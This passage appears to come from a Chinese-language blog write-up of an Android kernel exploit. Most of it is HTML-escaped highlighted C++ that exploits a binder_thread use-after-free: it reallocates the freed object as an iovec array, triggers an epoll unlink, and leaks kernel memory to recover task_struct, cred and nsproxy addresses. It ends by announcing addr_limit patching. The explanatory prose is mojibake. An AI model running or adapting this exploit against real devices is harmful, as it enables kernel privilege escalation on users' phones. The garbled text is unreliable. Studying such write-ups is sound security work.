&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// binder_thread-&amp;gt;wait.lock will align to iovecStack[10].io_base.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// If binder_thread-&amp;gt;wait.lock is not 0 then the thread will get
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// stuck in trying to acquire the lock and the unlink operation
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// will not happen.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// To avoid this, we need to make sure that the overlapped data
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// should be set to 0.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// we can pass a valid memory address whose lower 32bit value is 0,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// then we can avoid spin lock issue.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mmap4gbAlignedPage&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m_4gb_aligned_page&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Now link the poll wait queue to binder thread wait queue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">linkEventPollWaitQueueToBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We should trigger the unlink operation when we
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// have the binder_thread reallocated as iovec array
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Now fork
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">pid_t&lt;/span> &lt;span class="n">childPid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fork&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">childPid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// child process
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// There is a race window between the unlink and blocking
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// in writev, so sleep for a while to ensure that we are
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// blocking in writev before the unlink happens
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Trigger the unlink operation on the reallocated chunk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">unlinkEventPollWaitQueueFromBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// First interesting iovec will read 0x1000 bytes of data.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This is just the junk data that we are not interested in
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesRead&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// parent process
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// I have seen some races which hinders the reallocation.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// So, now freeing the binder_thread after fork.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">freeBinderThread&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Reallocate binder_thread as iovec array
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We need to make sure this writev call blocks
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This will only happen when the pipe is already full
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// This print statement was ruining the reallocation,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// spent a night to figure this out. Commenting the
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// below line.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// INFO(&amp;#34;[+] Reallocating binder_thread\n&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">writev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If the corruption was successful, the total bytes written
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// should be equal to 0x2000. This is because there are two
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// valid iovec and the length of each is 0x1000
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Wrote 0x%lx bytes&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Now read the actual data from the corrupted iovec
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This is the leaked data from kernel address space
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and will contain the task_struct pointer
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesRead&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Wait for the child process to exit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">int64_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">dataBuffer&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">TASK_STRUCT_OFFSET_IN_LEAKED_DATA&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_pidAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_credAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m_nsproxyAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nsproxy&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Leaked task_struct: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_task_struct&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] &amp;amp;task_struct-&amp;gt;pid: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_pidAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] &amp;amp;task_struct-&amp;gt;cred: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_credAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] &amp;amp;task_struct-&amp;gt;nsproxy: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m_nsproxyAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¾ˆå¥½ç†è§£ï¼Œexpè¿™éƒ¨åˆ†é¦–å…ˆåˆå§‹åŒ–ç¯å¢ƒä¹‹ååˆ›å»ºç”¨äºreadvå’Œwritevçš„pipeï¼Œreadvå’Œwritevå‡½æ•°ç”¨äºåœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­è¯»ã€å†™å¤šä¸ªéè¿ç»­ç¼“å†²åŒºã€‚ä¿®æ”¹pipeçš„sizeä¸º0x1000ã€‚&lt;/p>
&lt;p>ä¹‹ååˆ›å»ºäº†25ä¸ªiovecï¼Œæ”¾åœ¨iovecStacké‡Œé¢ã€‚25ä¸ªæ˜¯æ ¹æ®binder_threadå’Œiovecçš„å¤§å°ç®—å‡ºæ¥&lt;/p>
&lt;p>&lt;code>IOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))&lt;/code>&lt;/p>
&lt;p>binder_threadç»“æ„ä½“å¤§å°ä¸º408ï¼Œ25ä¸ªiovecå¤§å°ä¸º25*16=400ï¼Œæ­£å¥½ã€‚è®¡ç®—å¯¹æ¯”&lt;strong>binder_thread&lt;/strong>ä¸­wait.headçš„åç§»0xA0å’Œ&lt;strong>iovecStack&lt;/strong>çš„åç§»iovecStack[10].iov_lenåŒ¹é…ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200629155854.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å‰é¢åŠ¨æ€è°ƒè¯•æ—¶ä¹Ÿèƒ½çœ‹åˆ°ä¼šæœ‰ä¸¤ä¸ªåœ°å€çš„å€¼ä¼šè¢«å†™å…¥åœ°å€ï¼Œè¿™é‡Œç›¸å¯¹åº”çš„ä½ç½®ä¸ºiovecStack[10].iov_len å’ŒiovecStack[11].io_baseã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¦ä¿®æ”¹iovecStack[10]çš„iov_lenå’Œpipeä¸€æ ·çš„å¤§å°ï¼Œé˜»å¡æ‰çˆ¶è¿›ç¨‹çš„writevç³»ç»Ÿè°ƒç”¨ï¼Œå†å»è§¦å‘unlinkæ“ä½œã€‚&lt;/p>
&lt;p>è¿™é‡Œçš„iovecStack[10].io_baseæ­£å¥½å¯¹ä¸Šbinder_thread-&amp;gt;wait.lockï¼Œå¦‚æœè¿™ä¸ªå€¼ä¸ä¸º0çš„è¯ï¼Œåé¢åœ¨å°è¯•å–è‡ªæ—‹é”é”ä¼šå‡ºé—®é¢˜ï¼Œä¸è¿›è¡Œunlinkæ“ä½œï¼Œè¿™ä¸ªå€¼æ˜¯32bitçš„ï¼Œiov_baseæ˜¯64bitçš„ï¼Œæ‰€ä»¥è¦è®¾ç½®å¯¹é½ï¼Œä½¿ç”¨mmapä¿è¯ä½32bitä¸º0ã€‚&lt;/p>
&lt;p>iovecStack[10].iov_lenå’ŒiovecStack[11].iov_lenè®¾ç½®ä¸ºpipe sizeçš„å¤§å°ï¼ŒiovecStack[11].io_base è®¾ç½®ä¸ºæ–°åˆ†é…çš„ä¸€ä¸ªåœ°å€ï¼Œ&lt;/p>
&lt;p>åˆ›å»ºforkå­è¿›ç¨‹è¿›è¡ŒEPOLL_CTL_DELæ“ä½œè§¦å‘unlinkã€‚è¯»å‡º0x1000 bytesçš„åƒåœ¾æ•°æ®æ¢å¤è¿›ç¨‹ï¼Œ&lt;/p>
&lt;p>çˆ¶è¿›ç¨‹freeæ‰binder_threadï¼Œè°ƒç”¨writevç³»ç»Ÿè¿›è¡Œé˜»å¡ï¼Œç­‰å¾…å­è¿›ç¨‹å®Œæˆã€‚&lt;/p>
&lt;p>æœ€åçˆ¶è¿›ç¨‹åœ¨è°ƒç”¨readè¯»å‡ºå·²ç»è¢«å­è¿›ç¨‹è¦†ç›–äº†å†…æ ¸åœ°å€å¤„çš„æ•°æ®ï¼Œæ ¹æ®åç§»è¯»å‡ºæ³„éœ²çš„task_structæŒ‡é’ˆã€‚&lt;/p>
&lt;p>ä¸‹é¢è¿™å¼ å›¾æ˜¯&lt;strong>Project Zero&lt;/strong> blogè´´å‡ºæ¥çš„æµç¨‹å›¾ï¼Œæ–¹ä¾¿ç†è§£æ•´ä¸ªè¿‡ç¨‹ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200629014014.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ—¢ç„¶å·²ç»æœ‰task_structæŒ‡é’ˆï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥patch æ‰AddrLimitã€‚ç›´æ¥çœ‹expå®ç°ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
